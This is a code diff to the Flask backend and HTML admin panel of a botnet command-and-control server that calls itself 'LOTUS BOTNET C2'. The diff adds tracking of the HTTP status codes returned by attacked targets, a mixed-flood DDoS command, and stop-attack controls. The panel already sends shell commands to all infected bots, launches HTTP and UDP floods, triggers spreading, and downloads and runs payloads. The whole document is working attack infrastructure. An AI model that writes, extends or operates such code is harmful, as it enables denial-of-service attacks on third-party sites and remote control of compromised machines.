@@ -38,6 +38,13 @@ def init_db():
         message TEXT,
         timestamp INTEGER
     )''')
+    conn.execute('''CREATE TABLE IF NOT EXISTS attack_status (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        bot_id TEXT,
+        target TEXT,
+        status_code TEXT,
+        timestamp INTEGER
+    )''')
     conn.commit()
     conn.close()
 
@@ -100,6 +107,46 @@ def save_result():
     conn.close()
     return 'OK'
 
+@app.route('/api/attack_status', methods=['POST'])
+def save_attack_status():
+    try:
+        data = request.get_json()
+        if not data:
+            return 'ERROR'
+        bot_id = data.get('bot_id')
+        target = data.get('target')
+        status_code = data.get('status_code')
+        if not bot_id or not target:
+            return 'ERROR'
+        conn = get_db()
+        conn.execute('INSERT INTO attack_status (bot_id, target, status_code, timestamp) VALUES (?, ?, ?, ?)',
+                     (bot_id, target, status_code, int(time.time())))
+        conn.commit()
+        conn.close()
+        log_msg = f"🌐 {target} - {status_code}"
+        conn = get_db()
+        conn.execute('INSERT INTO logs (bot_id, message, timestamp) VALUES (?, ?, ?)',
+                     (bot_id, log_msg, int(time.time())))
+        conn.commit()
+        conn.close()
+        return 'OK'
+    except:
+        return 'ERROR'
+
+@app.route('/api/attack_stats')
+def get_attack_stats():
+    target = request.args.get('target')
+    limit = request.args.get('limit', 100, type=int)
+    conn = get_db()
+    if target:
+        rows = conn.execute('SELECT * FROM attack_status WHERE target = ? ORDER BY timestamp DESC LIMIT ?', 
+                           (target, limit)).fetchall()
+    else:
+        rows = conn.execute('SELECT * FROM attack_status ORDER BY timestamp DESC LIMIT ?', 
+                           (limit,)).fetchall()
+    conn.close()
+    return jsonify([dict(row) for row in rows])
+
 @app.route('/api/info', methods=['POST'])
 def save_info():
     bot_id = request.args.get('id')
@@ -120,8 +167,10 @@ def api_stats():
                           (int(time.time()) - 600,)).fetchone()[0]
     offline = total - online
     commands = conn.execute('SELECT COUNT(*) FROM commands WHERE status = "pending"').fetchone()[0]
+    status_rows = conn.execute('SELECT status_code, COUNT(*) as count FROM attack_status GROUP BY status_code').fetchall()
     conn.close()
-    return jsonify({'total': total, 'online': online, 'offline': offline, 'commands': commands})
+    status_counts = {row['status_code']: row['count'] for row in status_rows}
+    return jsonify({'total': total, 'online': online, 'offline': offline, 'commands': commands, 'status_counts': status_counts})
 
 @app.route('/api/bots')
 def api_bots():
@@ -196,6 +245,8 @@ def admin():
         .stat .label { color: #666; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }
         .stat .num.online { color: #2ecc71; }
         .stat .num.offline { color: #e74c3c; }
+        .stat .num.status-200 { color: #2ecc71; }
+        .stat .num.status-503 { color: #e74c3c; }
         .tabs { display: flex; gap: 5px; margin-bottom: 20px; border-bottom: 1px solid #1A1A2E; flex-wrap: wrap; }
         .tab { padding: 10px 20px; cursor: pointer; border-radius: 8px 8px 0 0; transition: 0.3s; background: transparent; color: #666; border: none; font-size: 14px; }
         .tab:hover { color: #fff; background: #14141E; }
@@ -225,23 +276,29 @@ def admin():
         .console-input { display: flex; gap: 10px; margin-top: 10px; }
         .console-input input { flex: 1; background: #14141E; border: 1px solid #1A1A2E; color: #0f0; padding: 10px 15px; border-radius: 8px; font-family: monospace; font-size: 14px; }
         .console-input input:focus { outline: none; border-color: #2A7FFF; }
-        .console-output { max-height: 300px; overflow-y: auto; color: #0f0; font-size: 13px; line-height: 1.6; }
+        .console-output { max-height: 400px; overflow-y: auto; color: #0f0; font-size: 13px; line-height: 1.6; }
         .console-output .prompt { color: #2A7FFF; }
         .console-output .error { color: #e74c3c; }
         .console-output .info { color: #f1c40f; }
         .console-output .success { color: #2ecc71; }
+        .console-output .status-2xx { color: #2ecc71; }
+        .console-output .status-3xx { color: #f1c40f; }
+        .console-output .status-4xx { color: #e67e22; }
+        .console-output .status-5xx { color: #e74c3c; }
         .help-grid { display: grid; grid-template-columns: auto 1fr auto; gap: 5px 20px; font-size: 12px; color: #888; margin: 10px 0; }
         .help-grid .cmd { color: #2A7FFF; font-weight: 600; }
         .help-grid .desc { color: #A0A0B0; }
         .help-grid .example { color: #555; font-size: 11px; }
         @media (max-width: 768px) { .stats { flex-direction: column; } .cmd-form { flex-direction: column; } }
         .id-cell { font-family: monospace; font-size: 11px; max-width: 120px; overflow: hidden; text-overflow: ellipsis; }
-        .console-output .cmd-result { color: #fff; }
-        .console-output .cmd-result .status-code { font-weight: bold; }
-        .console-output .cmd-result .status-2xx { color: #2ecc71; }
-        .console-output .cmd-result .status-3xx { color: #f1c40f; }
-        .console-output .cmd-result .status-4xx { color: #e67e22; }
-        .console-output .cmd-result .status-5xx { color: #e74c3c; }
+        .status-badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-weight: bold; font-size: 11px; }
+        .status-badge.s200 { background: rgba(46,204,113,0.3); color: #2ecc71; }
+        .status-badge.s429 { background: rgba(230,126,34,0.3); color: #e67e22; }
+        .status-badge.s503 { background: rgba(231,76,60,0.3); color: #e74c3c; }
+        .status-badge.s500 { background: rgba(231,76,60,0.3); color: #e74c3c; }
+        .status-badge.s403 { background: rgba(230,126,34,0.3); color: #e67e22; }
+        .status-badge.s404 { background: rgba(230,126,34,0.3); color: #e67e22; }
+        .status-badge.s3xx { background: rgba(241,196,15,0.3); color: #f1c40f; }
     </style>
 </head>
 <body>
@@ -251,11 +308,14 @@ def admin():
         <div class="stat"><div class="num online" id="online">0</div><div class="label">Онлайн</div></div>
         <div class="stat"><div class="num offline" id="offline">0</div><div class="label">Оффлайн</div></div>
         <div class="stat"><div class="num" id="commands">0</div><div class="label">Команд в очереди</div></div>
+        <div class="stat"><div class="num status-200" id="stat200">0</div><div class="label">✅ 200 OK</div></div>
+        <div class="stat"><div class="num status-503" id="stat503">0</div><div class="label">❌ 503 Error</div></div>
     </div>
     <div class="tabs">
         <button class="tab active" onclick="showPanel('bots')">🤖 Боты</button>
         <button class="tab" onclick="showPanel('commands')">📡 Команды</button>
         <button class="tab" onclick="showPanel('logs')">📋 Логи</button>
+        <button class="tab" onclick="showPanel('status')">📊 Статусы</button>
         <button class="tab" onclick="showPanel('ddos')">💥 DDoS</button>
         <button class="tab" onclick="showPanel('console')">⌨️ КОНСОЛЬ</button>
     </div>
@@ -287,6 +347,7 @@ def admin():
                 <option value="spread">📀 Распространиться</option>
                 <option value="info">📊 Информация</option>
                 <option value="ping">🏓 Ping</option>
+                <option value="stop_attack">⏹ Остановить атаку</option>
             </select>
             <input type="text" id="cmdParams" placeholder="Параметры (URL, команда, цель)">
             <button type="submit">▶ Отправить</button>
@@ -303,6 +364,20 @@ def admin():
         <div class="logs" id="logsContainer"></div>
     </div>
     
+    <div class="panel" id="panel-status">
+        <h3 style="color:#fff; margin-bottom:15px;">📊 СТАТУСЫ HTTP АТАК</h3>
+        <div style="display:flex; gap:15px; flex-wrap:wrap; margin-bottom:15px;">
+            <span style="color:#2ecc71;">🟢 200 OK</span>
+            <span style="color:#f1c40f;">🟡 3xx Redirect</span>
+            <span style="color:#e67e22;">🟠 4xx Error</span>
+            <span style="color:#e74c3c;">🔴 5xx Error</span>
+            <span style="color:#e67e22;">🟠 429 Rate Limit</span>
+        </div>
+        <div id="statusContainer" style="font-family: monospace; font-size: 13px; max-height: 400px; overflow-y: auto;">
+            <div class="info">Ожидание данных...</div>
+        </div>
+    </div>
+    
     <div class="panel" id="panel-ddos">
         <h3 style="color:#fff; margin-bottom:15px;">💥 МАССОВАЯ DDoS АТАКА</h3>
         <form class="cmd-form" onsubmit="startDDoS(event)">
@@ -310,8 +385,9 @@ def admin():
             <button type="submit" style="background:#c0392b;">🔥 ЗАПУСТИТЬ DDoS</button>
         </form>
         <div class="ddos-panel">
-            <p style="color:#666; font-size:12px;">💡 Атака начнется через 5-15 секунд на всех подключенных ботах</p>
+            <p style="color:#666; font-size:12px;">💡 Атака начнется через 1-5 секунд на всех подключенных ботах</p>
             <p style="color:#666; font-size:12px;">📊 Ботов в атаке: <span id="ddosCount">0</span></p>
+            <button class="btn danger" onclick="stopAttack()" style="margin-top:10px;">⏹ ОСТАНОВИТЬ ВСЕ АТАКИ</button>
         </div>
     </div>
     
@@ -321,7 +397,7 @@ def admin():
             <div class="console-output" id="consoleOutput">
                 <div class="info">=== LOTUS BOTNET C2 CONSOLE ===</div>
                 <div class="info">Введите help для списка команд</div>
-                <div class="info">Команды выполняются на всех онлайн ботах</div>
+                <div class="info">Статусы HTTP отображаются в реальном времени</div>
                 <div style="margin-top:10px; border-top:1px solid #1A1A2E; padding-top:10px;"></div>
             </div>
             <div class="console-input">
@@ -334,28 +410,30 @@ def admin():
             <details style="color:#666; font-size:12px;">
                 <summary style="cursor:pointer; color:#2A7FFF;">📖 Список команд (help)</summary>
                 <div class="help-grid">
-                    <span class="cmd">help</span><span class="desc">Показать это меню</span><span class="example"></span>
-                    <span class="cmd">list</span><span class="desc">Список всех ботов</span><span class="example"></span>
+                    <span class="cmd">help</span><span class="desc">Показать это меню</span>
+                    <span class="cmd">list</span><span class="desc">Список всех ботов</span>
                     <span class="cmd">cmd &lt;команда&gt;</span><span class="desc">Выполнить CMD на всех ботах</span><span class="example">cmd whoami</span>
                     <span class="cmd">cmd &lt;бот_id&gt; &lt;команда&gt;</span><span class="desc">Выполнить CMD на конкретном боте</span><span class="example">cmd BOT_123 whoami</span>
-                    <span class="cmd">ddos &lt;url&gt;</span><span class="desc">Запустить HTTP Flood на всех ботах</span><span class="example">ddos https://target.com</span>
-                    <span class="cmd">udp &lt;url&gt;</span><span class="desc">Запустить UDP Flood на всех ботах</span><span class="example">udp https://target.com</span>
-                    <span class="cmd">info &lt;бот_id&gt;</span><span class="desc">Получить информацию о боте</span><span class="example">info BOT_123</span>
-                    <span class="cmd">info</span><span class="desc">Получить информацию о всех ботах</span><span class="example"></span>
-                    <span class="cmd">kill &lt;бот_id&gt;</span><span class="desc">Самоуничтожение бота</span><span class="example">kill BOT_123</span>
-                    <span class="cmd">spread</span><span class="desc">Запустить распространение на всех ботах</span><span class="example"></span>
-                    <span class="cmd">download &lt;url&gt;</span><span class="desc">Скачать и запустить файл на всех ботах</span><span class="example">download https://example.com/payload.exe</span>
-                    <span class="cmd">update &lt;url&gt;</span><span class="desc">Обновить ботов</span><span class="example">update https://example.com/new_bot.exe</span>
-                    <span class="cmd">ping</span><span class="desc">Проверить соединение с ботами</span><span class="example"></span>
-                    <span class="cmd">logs</span><span class="desc">Показать последние логи</span><span class="example"></span>
-                    <span class="cmd">clear</span><span class="desc">Очистить логи</span><span class="example"></span>
-                    <span class="cmd">stats</span><span class="desc">Показать статистику</span><span class="example"></span>
+                    <span class="cmd">ddos &lt;url&gt;</span><span class="desc">HTTP Flood</span><span class="example">ddos https://target.com</span>
+                    <span class="cmd">udp &lt;url&gt;</span><span class="desc">UDP Flood</span>
+                    <span class="cmd">mix &lt;url&gt;</span><span class="desc">ВСЕ ТИПЫ АТАК ОДНОВРЕМЕННО</span>
+                    <span class="cmd">info &lt;бот_id&gt;</span><span class="desc">Информация о боте</span>
+                    <span class="cmd">kill &lt;бот_id&gt;</span><span class="desc">Самоуничтожение</span>
+                    <span class="cmd">spread</span><span class="desc">Распространение</span>
+                    <span class="cmd">stop</span><span class="desc">Остановить все атаки</span>
+                    <span class="cmd">ping</span><span class="desc">Проверить соединение</span>
+                    <span class="cmd">stats</span><span class="desc">Статистика</span>
+                    <span class="cmd">logs</span><span class="desc">Показать логи</span>
+                    <span class="cmd">clear</span><span class="desc">Очистить логи</span>
                 </div>
             </details>
         </div>
     </div>
     
     <script>
+        let attackTarget = '';
+        let statusInterval = null;
+        
         function showPanel(name) {
             document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
             document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
@@ -363,6 +441,7 @@ def admin():
             document.querySelector(`.tab[onclick*="${name}"]`).classList.add('active');
             if (name === 'bots') refreshBots();
             if (name === 'logs') refreshLogs();
+            if (name === 'status') refreshAttackStatus();
             if (name === 'console') document.getElementById('consoleInput').focus();
         }
         
@@ -375,6 +454,10 @@ def admin():
                 document.getElementById('offline').textContent = data.offline || 0;
                 document.getElementById('commands').textContent = data.commands || 0;
                 document.getElementById('ddosCount').textContent = data.online || 0;
+                if (data.status_counts) {
+                    document.getElementById('stat200').textContent = data.status_counts['200 OK'] || 0;
+                    document.getElementById('stat503').textContent = data.status_counts['503 Service Unavailable'] || 0;
+                }
             } catch {}
         }
         
@@ -412,9 +495,68 @@ def admin():
                     const div = document.createElement('div');
                     div.className = 'log';
                     const time = new Date(log.timestamp * 1000).toLocaleTimeString();
-                    div.innerHTML = `<span class="time">[${time}]</span> <span class="bot">${log.bot_id}</span> <span class="msg">${log.message}</span>`;
+                    let msg = log.message;
+                    // Окрашиваем статусы
+                    if (msg.includes('200')) msg = '✅ ' + msg;
+                    else if (msg.includes('503')) msg = '❌ ' + msg;
+                    else if (msg.includes('429')) msg = '⚠️ ' + msg;
+                    else if (msg.includes('4')) msg = '⚠️ ' + msg;
+                    else if (msg.includes('5')) msg = '❌ ' + msg;
+                    div.innerHTML = `<span class="time">[${time}]</span> <span class="bot">${log.bot_id}</span> <span class="msg">${msg}</span>`;
                     container.appendChild(div);
                 });
+            } catch {}
+        }
+        
+        async function refreshAttackStatus() {
+            try {
+                const r = await fetch('/api/attack_stats?limit=100');
+                const data = await r.json();
+                const container = document.getElementById('statusContainer');
+                container.innerHTML = '';
+                if (data.length === 0) {
+                    container.innerHTML = '<div class="info">Нет данных об атаках</div>';
+                    return;
+                }
+                const targets = {};
+                data.forEach(item => {
+                    if (!targets[item.target]) targets[item.target] = [];
+                    targets[item.target].push(item);
+                });
+                for (const [target, items] of Object.entries(targets)) {
+                    const div = document.createElement('div');
+                    div.style.cssText = 'margin: 10px 0; padding: 10px; background: #0A0A0F; border-radius: 8px;';
+                    const stats = {};
+                    items.forEach(item => {
+                        const code = item.status_code || 'Unknown';
+                        stats[code] = (stats[code] || 0) + 1;
+                    });
+                    let statusHtml = `<div style="color:#2A7FFF; font-weight:bold;">🎯 ${target}</div><div style="display:flex; gap:15px; flex-wrap:wrap; margin-top:5px;">`;
+                    for (const [code, count] of Object.entries(stats)) {
+                        let color = '#888';
+                        let cls = '';
+                        if (code.includes('200')) { color = '#2ecc71'; cls = 's200'; }
+                        else if (code.includes('3')) { color = '#f1c40f'; cls = 's3xx'; }
+                        else if (code.includes('429')) { color = '#e67e22'; cls = 's429'; }
+                        else if (code.includes('4')) { color = '#e67e22'; cls = 's4xx'; }
+                        else if (code.includes('5')) { color = '#e74c3c'; cls = 's5xx'; }
+                        statusHtml += `<span style="color:${color}; font-weight:bold;" class="status-badge ${cls}">${code}: ${count}</span>`;
+                    }
+                    statusHtml += '</div>';
+                    const last5 = items.slice(0, 5);
+                    statusHtml += '<div style="font-size:11px; color:#666; margin-top:5px;">Последние: ';
+                    last5.forEach((item) => {
+                        const time = new Date(item.timestamp * 1000).toLocaleTimeString();
+                        let color = '#888';
+                        if (item.status_code && item.status_code.includes('200')) color = '#2ecc71';
+                        else if (item.status_code && item.status_code.includes('5')) color = '#e74c3c';
+                        else if (item.status_code && item.status_code.includes('429')) color = '#e67e22';
+                        statusHtml += `<span style="color:${color}">[${time}] ${item.status_code || 'Unknown'}</span> `;
+                    });
+                    statusHtml += '</div>';
+                    div.innerHTML = statusHtml;
+                    container.appendChild(div);
+                }
             } catch {}
         }
         
@@ -447,6 +589,7 @@ def admin():
             e.preventDefault();
             const target = document.getElementById('ddosTarget').value;
             if (!target) return;
+            attackTarget = target;
             const formData = new FormData();
             formData.append('bot_id', 'all');
             formData.append('command', 'http_flood');
@@ -455,7 +598,25 @@ def admin():
             document.getElementById('ddosTarget').value = '';
             refreshStats();
             addConsoleLine('success', '🔥 DDoS атака запущена на ' + target);
+            // Автоматически показываем статусы
+            if (!statusInterval) {
+                statusInterval = setInterval(refreshAttackStatus, 3000);
+            }
             alert('🔥 DDoS атака запущена на ' + target);
+        }
+        
+        async function stopAttack() {
+            const formData = new FormData();
+            formData.append('bot_id', 'all');
+            formData.append('command', 'stop_attack');
+            formData.append('params', '');
+            await fetch('/api/send_command', { method: 'POST', body: formData });
+            addConsoleLine('success', '⏹ Все атаки остановлены');
+            if (statusInterval) {
+                clearInterval(statusInterval);
+                statusInterval = null;
+            }
+            alert('⏹ Все атаки остановлены');
         }
         
         async function deleteBot(id) {
@@ -491,7 +652,13 @@ def admin():
             const output = document.getElementById('consoleOutput');
             const div = document.createElement('div');
             const time = new Date().toLocaleTimeString();
-            div.innerHTML = `<span style="color:#555;">[${time}]</span> <span class="${type}">${text}</span>`;
+            let colorClass = type;
+            if (text.includes('200')) colorClass = 'status-2xx';
+            else if (text.includes('503')) colorClass = 'status-5xx';
+            else if (text.includes('429')) colorClass = 'status-4xx';
+            else if (text.includes('4')) colorClass = 'status-4xx';
+            else if (text.includes('5')) colorClass = 'status-5xx';
+            div.innerHTML = `<span style="color:#555;">[${time}]</span> <span class="${colorClass}">${text}</span>`;
             output.appendChild(div);
             output.scrollTop = output.scrollHeight;
         }
@@ -500,6 +667,7 @@ def admin():
             document.getElementById('consoleOutput').innerHTML = `
                 <div class="info">=== LOTUS BOTNET C2 CONSOLE ===</div>
                 <div class="info">Введите help для списка команд</div>
+                <div class="info">Статусы HTTP отображаются в реальном времени</div>
                 <div style="margin-top:10px; border-top:1px solid #1A1A2E; padding-top:10px;"></div>
             `;
         }
@@ -515,10 +683,8 @@ def admin():
             const input = document.getElementById('consoleInput');
             const cmd = input.value.trim();
             if (!cmd) return;
-            
             input.value = '';
             addConsoleLine('prompt', '> ' + cmd);
-            
             const { command, args } = parseCommand(cmd);
             
             try {
@@ -527,17 +693,17 @@ def admin():
                         addConsoleLine('info', 'Доступные команды:');
                         addConsoleLine('info', '  help - показать это меню');
                         addConsoleLine('info', '  list - список ботов');
-                        addConsoleLine('info', '  cmd <команда> - выполнить CMD на всех ботах (пример: cmd whoami)');
-                        addConsoleLine('info', '  cmd <бот_id> <команда> - выполнить CMD на конкретном боте');
-                        addConsoleLine('info', '  ddos <url> - HTTP Flood (пример: ddos https://target.com)');
+                        addConsoleLine('info', '  cmd <команда> - CMD на всех ботах');
+                        addConsoleLine('info', '  cmd <бот_id> <команда> - CMD на конкретном');
+                        addConsoleLine('info', '  ddos <url> - HTTP Flood');
                         addConsoleLine('info', '  udp <url> - UDP Flood');
+                        addConsoleLine('info', '  mix <url> - ВСЕ ТИПЫ ОДНОВРЕМЕННО');
                         addConsoleLine('info', '  info <бот_id> - информация о боте');
-                        addConsoleLine('info', '  kill <бот_id> - самоуничтожение бота');
-                        addConsoleLine('info', '  spread - распространение на всех ботах');
-                        addConsoleLine('info', '  download <url> - скачать и запустить');
-                        addConsoleLine('info', '  update <url> - обновить ботов');
+                        addConsoleLine('info', '  kill <бот_id> - самоуничтожение');
+                        addConsoleLine('info', '  spread - распространение');
+                        addConsoleLine('info', '  stop - остановить все атаки');
                         addConsoleLine('info', '  ping - проверить соединение');
-                        addConsoleLine('info', '  stats - статистика ботов');
+                        addConsoleLine('info', '  stats - статистика');
                         addConsoleLine('info', '  logs - показать логи');
                         addConsoleLine('info', '  clear - очистить логи');
                         break;
@@ -570,6 +736,10 @@ def admin():
                         await clearLogs();
                         break;
                         
+                    case 'stop':
+                        await stopAttack();
+                        break;
+                        
                     case 'ping':
                         const pingForm = new FormData();
                         pingForm.append('bot_id', 'all');
@@ -581,12 +751,11 @@ def admin():
                         
                     case 'cmd':
                         if (args.length === 0) {
-                            addConsoleLine('error', '❌ Использование: cmd <команда> или cmd <бот_id> <команда>');
+                            addConsoleLine('error', '❌ Использование: cmd <команда>');
                             break;
                         }
                         let target = 'all';
                         let cmdToExec = args.join(' ');
-                        // Проверяем, первый аргумент похож на ID бота (не команда)
                         if (args.length > 1 && args[0].startsWith('BOT_')) {
                             target = args[0];
                             cmdToExec = args.slice(1).join(' ');
@@ -610,6 +779,9 @@ def admin():
                         ddosForm.append('params', args[0]);
                         await fetch('/api/send_command', { method: 'POST', body: ddosForm });
                         addConsoleLine('success', `🔥 DDoS запущен на ${args[0]}`);
+                        if (!statusInterval) {
+                            statusInterval = setInterval(refreshAttackStatus, 3000);
+                        }
                         break;
                         
                     case 'udp':
@@ -623,6 +795,19 @@ def admin():
                         udpForm.append('params', args[0]);
                         await fetch('/api/send_command', { method: 'POST', body: udpForm });
                         addConsoleLine('success', `🔥 UDP Flood запущен на ${args[0]}`);
+                        break;
+                        
+                    case 'mix':
+                        if (args.length === 0) {
+                            addConsoleLine('error', '❌ Использование: mix <url>');
+                            break;
+                        }
+                        const mixForm = new FormData();
+                        mixForm.append('bot_id', 'all');
+                        mixForm.append('command', 'mix_flood');
+                        mixForm.append('params', args[0]);
+                        await fetch('/api/send_command', { method: 'POST', body: mixForm });
+                        addConsoleLine('success', `⚡ MIX ATTACK запущен на ${args[0]}`);
                         break;
                         
                     case 'info':
@@ -690,11 +875,9 @@ def admin():
             } catch(e) {
                 addConsoleLine('error', '❌ Ошибка: ' + e.message);
             }
-            
             refreshStats();
         }
         
-        // Enter для консоли
         document.getElementById('consoleInput').addEventListener('keydown', function(e) {
             if (e.key === 'Enter') {
                 e.preventDefault();
@@ -703,11 +886,14 @@ def admin():
         });
         
         // ============== ИНИЦИАЛИЗАЦИЯ ==============
-        setInterval(refreshStats, 10000);
-        setInterval(refreshBots, 30000);
+        setInterval(refreshStats, 5000);
+        setInterval(refreshBots, 15000);
+        setInterval(refreshLogs, 5000);
+        setInterval(refreshAttackStatus, 3000);
         refreshStats();
         refreshBots();
         refreshLogs();
+        refreshAttackStatus();
     </script>
 </body>
 </html>
